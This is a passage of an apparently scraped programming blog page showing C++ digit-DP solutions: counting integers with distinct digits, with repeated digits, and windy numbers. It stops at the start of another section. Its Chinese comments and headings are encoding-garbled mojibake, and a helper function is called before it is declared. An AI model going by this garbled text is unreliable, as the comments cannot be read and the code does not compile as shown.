class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MOD = <span class="hljs-number">1000000007</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">countSpecialNumbers</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> &#123;<br>    <span class="hljs-type">int</span> len = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> offset = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> tmp = n / <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">while</span> (tmp &gt; <span class="hljs-number">0</span>) &#123;<br>        len++;<br>        offset *= <span class="hljs-number">10</span>;<br>        tmp /= <span class="hljs-number">10</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// cnt[i] :</span><br>    <span class="hljs-comment">// ä¸€å…±é•¿åº¦ä¸ºlenï¼Œè¿˜å‰©iä½æ²¡æœ‰ç¡®å®šï¼Œç¡®å®šçš„å‰ç¼€ä¸ºlen-iä½ï¼Œä¸”ç¡®å®šçš„å‰ç¼€ä¸ä¸ºç©º</span><br>    <span class="hljs-comment">// 0~9ä¸€å…±10ä¸ªæ•°å­—ï¼Œæ²¡æœ‰é€‰æ‹©çš„æ•°å­—å‰©ä¸‹10-(len-i)ä¸ª</span><br>    <span class="hljs-comment">// é‚£ä¹ˆåœ¨åç»­çš„iä½ä¸Šï¼Œæœ‰å¤šå°‘ç§æ’åˆ—</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">cnt</span><span class="hljs-params">(len)</span>;<br>    cnt[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>, k = <span class="hljs-number">10</span> - len + <span class="hljs-number">1</span>; i &lt; len; i++, k++) &#123;<br>        cnt[i] = cnt[i - <span class="hljs-number">1</span>] * k;<br>    &#125;<br>    <br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (len &gt;= <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-comment">// å¦‚æœnçš„ä½æ•°æ˜¯lenä½ï¼Œå…ˆè®¡ç®—ä½æ•°å°‘äºlençš„æ•°ä¸­ï¼Œæ¯ä¸€ä½éƒ½äº’ä¸ç›¸åŒçš„æ­£æ•´æ•°ä¸ªæ•°ï¼Œå¹¶ç´¯åŠ </span><br>        <span class="hljs-comment">// æ‰€æœ‰1ä½æ•°ä¸­ï¼Œæ¯ä¸€ä½éƒ½äº’ä¸ç›¸åŒçš„æ­£æ•´æ•°ä¸ªæ•° = 9</span><br>        <span class="hljs-comment">// æ‰€æœ‰2ä½æ•°ä¸­ï¼Œæ¯ä¸€ä½éƒ½äº’ä¸ç›¸åŒçš„æ­£æ•´æ•°ä¸ªæ•° = 9 * 9</span><br>        <span class="hljs-comment">// æ‰€æœ‰3ä½æ•°ä¸­ï¼Œæ¯ä¸€ä½éƒ½äº’ä¸ç›¸åŒçš„æ­£æ•´æ•°ä¸ªæ•° = 9 * 9 * 8</span><br>        <span class="hljs-comment">// æ‰€æœ‰4ä½æ•°ä¸­ï¼Œæ¯ä¸€ä½éƒ½äº’ä¸ç›¸åŒçš„æ­£æ•´æ•°ä¸ªæ•° = 9 * 9 * 8 * 7</span><br>        <span class="hljs-comment">// ...æ¯”lenå°‘çš„ä½æ•°éƒ½ç´¯åŠ ...</span><br>        ans = <span class="hljs-number">9</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>, a = <span class="hljs-number">9</span>, b = <span class="hljs-number">9</span>; i &lt; len; i++, b--) &#123;<br>            a *= b;<br>            ans += a;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// å¦‚æœnçš„ä½æ•°æ˜¯lenä½ï¼Œå·²ç»è®¡ç®—äº†ä½æ•°å°‘äºlenä¸ªçš„æƒ…å†µ</span><br>    <span class="hljs-comment">// ä¸‹é¢è®¡ç®—ä¸€å®šæœ‰lenä½çš„æ•°å­—ä¸­ï¼Œ&lt;=nä¸”æ¯ä¸€ä½éƒ½äº’ä¸ç›¸åŒçš„æ­£æ•´æ•°ä¸ªæ•°</span><br>    <span class="hljs-type">int</span> first = n / offset;<br>    <span class="hljs-comment">// å°äºnumæœ€é«˜ä½æ•°å­—çš„æƒ…å†µ</span><br>    ans += (first - <span class="hljs-number">1</span>) * cnt[len - <span class="hljs-number">1</span>];<br>    <span class="hljs-comment">// åç»­ç´¯åŠ ä¸Šï¼Œç­‰äºnumæœ€é«˜ä½æ•°å­—çš„æƒ…å†µ</span><br>    ans += f(cnt, n, len - <span class="hljs-number">1</span>, offset / <span class="hljs-number">10</span>, <span class="hljs-number">1</span> &lt;&lt; first);<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-comment">// ä¹‹å‰å·²ç»ç¡®å®šäº†å’Œnumä¸€æ ·çš„å‰ç¼€ï¼Œä¸”ç¡®å®šçš„éƒ¨åˆ†ä¸€å®šä¸ä¸ºç©º</span><br><span class="hljs-comment">// è¿˜æœ‰lenä½æ²¡æœ‰ç¡®å®š</span><br><span class="hljs-comment">// å“ªäº›æ•°å­—å·²ç»é€‰äº†ï¼Œå“ªäº›æ•°å­—æ²¡æœ‰é€‰ï¼Œç”¨statusè¡¨ç¤º</span><br><span class="hljs-comment">// è¿”å›&lt;=numä¸”æ¯ä¸€ä½æ•°å­—éƒ½ä¸ä¸€æ ·çš„æ­£æ•´æ•°æœ‰å¤šå°‘ä¸ª</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">f</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; cnt, <span class="hljs-type">int</span> num, <span class="hljs-type">int</span> len, <span class="hljs-type">int</span> offset, <span class="hljs-type">int</span> status)</span> &#123;<br>    <span class="hljs-keyword">if</span> (len == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// numè‡ªå·±</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// firstæ˜¯numå½“å‰ä½çš„æ•°å­—</span><br>    <span class="hljs-type">int</span> first = (num / offset) % <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> cur = <span class="hljs-number">0</span>; cur &lt; first; cur++) &#123;<br>        <span class="hljs-keyword">if</span> ((status &amp; (<span class="hljs-number">1</span> &lt;&lt; cur)) == <span class="hljs-number">0</span>) &#123;<br>            ans += cnt[len - <span class="hljs-number">1</span>];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((status &amp; (<span class="hljs-number">1</span> &lt;&lt; first)) == <span class="hljs-number">0</span>) &#123;<br>        ans += f(cnt, num, len - <span class="hljs-number">1</span>, offset / <span class="hljs-number">10</span>, status | (<span class="hljs-number">1</span> &lt;&lt; first));<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">100</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Result: &quot;</span> &lt;&lt; countSpecialNumbers(n) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="è‡³å°‘æœ‰1ä½é‡å¤çš„æ•°å­—ä¸ªæ•°"><a href="#è‡³å°‘æœ‰1ä½é‡å¤çš„æ•°å­—ä¸ªæ•°" class="headerlink" title="è‡³å°‘æœ‰1ä½é‡å¤çš„æ•°å­—ä¸ªæ•°"></a>è‡³å°‘æœ‰1ä½é‡å¤çš„æ•°å­—ä¸ªæ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// è‡³å°‘æœ‰1ä½é‡å¤çš„æ•°å­—ä¸ªæ•°</span><br><span class="hljs-comment">// ç»™å®šæ­£æ•´æ•°nï¼Œè¿”å›åœ¨[1, n]èŒƒå›´å†…è‡³å°‘æœ‰1ä½é‡å¤æ•°å­—çš„æ­£æ•´æ•°ä¸ªæ•°</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">countSpecialNumbers</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> &#123;<br>    <span class="hljs-type">int</span> len = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> offset = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> tmp = n / <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">while</span> (tmp &gt; <span class="hljs-number">0</span>) &#123;<br>        len++;<br>        offset *= <span class="hljs-number">10</span>;<br>        tmp /= <span class="hljs-number">10</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// cnt[i] : ä¸€å…±é•¿åº¦ä¸ºlenï¼Œè¿˜å‰©iä½æ²¡æœ‰ç¡®å®šï¼Œç¡®å®šçš„å‰ç¼€ä¸ºlen-iä½ï¼Œä¸”ç¡®å®šçš„å‰ç¼€ä¸ä¸ºç©º</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">cnt</span><span class="hljs-params">(len)</span>;<br>    cnt[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>, k = <span class="hljs-number">10</span> - len + <span class="hljs-number">1</span>; i &lt; len; i++, k++) &#123;<br>        cnt[i] = cnt[i - <span class="hljs-number">1</span>] * k;<br>    &#125;<br>    <br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (len &gt;= <span class="hljs-number">2</span>) &#123;<br>        ans = <span class="hljs-number">9</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>, a = <span class="hljs-number">9</span>, b = <span class="hljs-number">9</span>; i &lt; len; i++, b--) &#123;<br>            a *= b;<br>            ans += a;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">int</span> first = n / offset;<br>    <span class="hljs-comment">// å°äºnumæœ€é«˜ä½æ•°å­—çš„æƒ…å†µ</span><br>    ans += (first - <span class="hljs-number">1</span>) * cnt[len - <span class="hljs-number">1</span>];<br>    <span class="hljs-comment">// åç»­ç´¯åŠ ä¸Šï¼Œç­‰äºnumæœ€é«˜ä½æ•°å­—çš„æƒ…å†µ</span><br>    ans += f(cnt, n, len - <span class="hljs-number">1</span>, offset / <span class="hljs-number">10</span>, <span class="hljs-number">1</span> &lt;&lt; first);<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-comment">// ä¹‹å‰å·²ç»ç¡®å®šäº†å’Œnumä¸€æ ·çš„å‰ç¼€ï¼Œä¸”ç¡®å®šçš„éƒ¨åˆ†ä¸€å®šä¸ä¸ºç©º</span><br><span class="hljs-comment">// è¿˜æœ‰lenä½æ²¡æœ‰ç¡®å®š</span><br><span class="hljs-comment">// å“ªäº›æ•°å­—å·²ç»é€‰äº†ï¼Œå“ªäº›æ•°å­—æ²¡æœ‰é€‰ï¼Œç”¨statusè¡¨ç¤º</span><br><span class="hljs-comment">// è¿”å›&lt;=numä¸”æ¯ä¸€ä½æ•°å­—éƒ½ä¸ä¸€æ ·çš„æ­£æ•´æ•°æœ‰å¤šå°‘ä¸ª</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">f</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; cnt, <span class="hljs-type">int</span> num, <span class="hljs-type">int</span> len, <span class="hljs-type">int</span> offset, <span class="hljs-type">int</span> status)</span> &#123;<br>    <span class="hljs-keyword">if</span> (len == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> first = (num / offset) % <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> cur = <span class="hljs-number">0</span>; cur &lt; first; cur++) &#123;<br>        <span class="hljs-keyword">if</span> ((status &amp; (<span class="hljs-number">1</span> &lt;&lt; cur)) == <span class="hljs-number">0</span>) &#123;<br>            ans += cnt[len - <span class="hljs-number">1</span>];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((status &amp; (<span class="hljs-number">1</span> &lt;&lt; first)) == <span class="hljs-number">0</span>) &#123;<br>        ans += f(cnt, num, len - <span class="hljs-number">1</span>, offset / <span class="hljs-number">10</span>, status | (<span class="hljs-number">1</span> &lt;&lt; first));<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">numDupDigitsAtMostN</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> &#123;<br>    <span class="hljs-keyword">return</span> n - countSpecialNumbers(n);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">100</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Result: &quot;</span> &lt;&lt; numDupDigitsAtMostN(n) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="windyæ•°"><a href="#windyæ•°" class="headerlink" title="windyæ•°"></a>windyæ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdlib&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXLEN = <span class="hljs-number">11</span>;<br><span class="hljs-type">int</span> dp[MAXLEN][<span class="hljs-number">11</span>][<span class="hljs-number">2</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">build</span><span class="hljs-params">(<span class="hljs-type">int</span> len)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= len; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">10</span>; j++) &#123;<br>            dp[i][j][<span class="hljs-number">0</span>] = <span class="hljs-number">-1</span>;<br>            dp[i][j][<span class="hljs-number">1</span>] = <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">f</span><span class="hljs-params">(<span class="hljs-type">int</span> num, <span class="hljs-type">int</span> offset, <span class="hljs-type">int</span> len, <span class="hljs-type">int</span> pre, <span class="hljs-type">int</span> <span class="hljs-built_in">free</span>)</span> &#123;<br>    <span class="hljs-keyword">if</span> (len == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (dp[len][pre][<span class="hljs-built_in">free</span>] != <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-keyword">return</span> dp[len][pre][<span class="hljs-built_in">free</span>];<br>    &#125;<br>    <span class="hljs-type">int</span> cur = num / offset % <span class="hljs-number">10</span>;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">free</span> == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (pre == <span class="hljs-number">10</span>) &#123;<br>            <span class="hljs-comment">// ä¹‹å‰çš„ä½å’Œnumä¸€æ ·ï¼Œæ­¤æ—¶ä¸èƒ½éšæ„é€‰æ‹©æ•°å­—</span><br>            <span class="hljs-comment">// ä¹Ÿä»æ¥æ²¡æœ‰é€‰æ‹©è¿‡æ•°å­—</span><br>            <span class="hljs-comment">// å°±è¡¨ç¤ºï¼šæ¥åˆ°çš„æ˜¯numçš„æœ€é«˜ä½</span><br>            ans += f(num, offset / <span class="hljs-number">10</span>, len - <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">// ä¸€ä¸ªæ•°å­—ä¹Ÿä¸è¦</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; cur; i++) &#123;<br>                ans += f(num, offset / <span class="hljs-number">10</span>, len - <span class="hljs-number">1</span>, i, <span class="hljs-number">1</span>);<br>            &#125;<br>            ans += f(num, offset / <span class="hljs-number">10</span>, len - <span class="hljs-number">1</span>, cur, <span class="hljs-number">0</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// ä¹‹å‰çš„ä½å’Œnumä¸€æ ·ï¼Œæ­¤æ—¶ä¸èƒ½éšæ„é€‰æ‹©æ•°å­—ï¼Œ</span><br>            <span class="hljs-comment">// ä¹‹å‰é€‰æ‹©è¿‡æ•°å­—pre</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; i++) &#123;<br>                <span class="hljs-keyword">if</span> (i &lt;= pre - <span class="hljs-number">2</span> || i &gt;= pre + <span class="hljs-number">2</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (i &lt; cur) &#123;<br>                        ans += f(num, offset / <span class="hljs-number">10</span>, len - <span class="hljs-number">1</span>, i, <span class="hljs-number">1</span>);<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i == cur) &#123;<br>                        ans += f(num, offset / <span class="hljs-number">10</span>, len - <span class="hljs-number">1</span>, cur, <span class="hljs-number">0</span>);<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (pre == <span class="hljs-number">10</span>) &#123;<br>            <span class="hljs-comment">// free == 1ï¼Œå¯ä»¥è‡ªç”±é€‰æ‹©æ•°å­—ï¼Œå‰é¢çš„çŠ¶å†µ &lt; num</span><br>            <span class="hljs-comment">// ä»æ¥æ²¡æœ‰é€‰æ‹©è¿‡æ•°å­—</span><br>            ans += f(num, offset / <span class="hljs-number">10</span>, len - <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">// è¿˜æ˜¯å¯ä»¥ä¸é€‰æ‹©æ•°å­—</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">9</span>; i++) &#123;<br>                ans += f(num, offset / <span class="hljs-number">10</span>, len - <span class="hljs-number">1</span>, i, <span class="hljs-number">1</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// free == 1ï¼Œå¯ä»¥è‡ªç”±é€‰æ‹©æ•°å­—ï¼Œå‰é¢çš„çŠ¶å†µ &lt; num</span><br>            <span class="hljs-comment">// é€‰æ‹©è¿‡æ•°å­—pre</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; i++) &#123;<br>                <span class="hljs-keyword">if</span> (i &lt;= pre - <span class="hljs-number">2</span> || i &gt;= pre + <span class="hljs-number">2</span>) &#123;<br>                    ans += f(num, offset / <span class="hljs-number">10</span>, len - <span class="hljs-number">1</span>, i, <span class="hljs-number">1</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    dp[len][pre][<span class="hljs-built_in">free</span>] = ans;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">cnt</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> &#123;<br>    <span class="hljs-keyword">if</span> (num == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> len = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> offset = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> tmp = num / <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">while</span> (tmp &gt; <span class="hljs-number">0</span>) &#123;<br>        len++;<br>        offset *= <span class="hljs-number">10</span>;<br>        tmp /= <span class="hljs-number">10</span>;<br>    &#125;<br>    build(len);<br>    <span class="hljs-keyword">return</span> f(num, offset, len, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">compute</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br>    <span class="hljs-keyword">return</span> cnt(b) - cnt(a - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> a, b;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">cin</span> &gt;&gt; a &gt;&gt; b) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; compute(a, b) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="èŒæ•°"><a href="#èŒæ•°" class="headerlink" title="èŒæ•°"></a>èŒæ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span 